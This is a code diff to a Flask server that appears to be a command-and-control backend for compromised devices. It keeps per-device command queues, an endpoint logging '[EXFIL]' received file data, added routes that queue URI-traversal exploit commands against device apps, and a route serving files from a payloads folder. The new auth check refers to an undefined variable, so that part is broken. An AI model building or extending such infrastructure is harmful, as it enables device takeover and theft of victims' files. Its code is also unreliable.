@@ -1,5 +1,8 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, abort, send_file
 from flask_cors import CORS
+import os
+import hmac, hashlib
+from token_utils import verify_signature
 
 app = Flask(__name__)
 CORS(app)
@@ -7,6 +10,14 @@ CORS(app)
 # In-memory command queue for demo (replace with DB in production)
 device_commands = {}
 device_outputs = {}
+
+@app.before_request
+def check_auth():
+    if request.path.startswith(("/get_command", "/set_command", "/post_output")):
+        agent_id = request.headers.get("X-Agent-ID")
+        sig = request.headers.get("X-Signature")
+        if not agent_id or not sig or not verify_signature(agent_id_sig):
+            abort(403)
 
 @app.route("/register", methods=["POST"])
 def register():
@@ -46,5 +57,25 @@ def receive_file():
     print(f"\n[EXFIL] Received file data:\n{content}\n")
     return jsonify({"status": "received"})
 
+@app.route("/exploit/uri_traversal", methods=["POST"])
+def uri_traversal():
+    data = request.json
+    package = data.get("package")
+    component = data.get("component")
+    
+    from modules import exploit_uri_traversal
+    command = exploit_uri_traversal.generate_command(package, component)
+    
+    device_id = data.get("device_id")
+    device_commands[device_id] = command
+    return jsonify({"status": "queued", "command": command})
+
+@app.route("/payloads/<filename>", methods=["GET"])
+def get_payload(filename):
+    payload_path = os.path.join("payloads", filename)
+    if not os.path.exists(payload_path):
+        return {"error": "File not found"}, 404
+    return send_file(payload_path, mimetype="application/octet-stream")
+
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    app.run(host="0.0.0.0", port=5000, ssl_context=("cert.pem", "key.pem"))
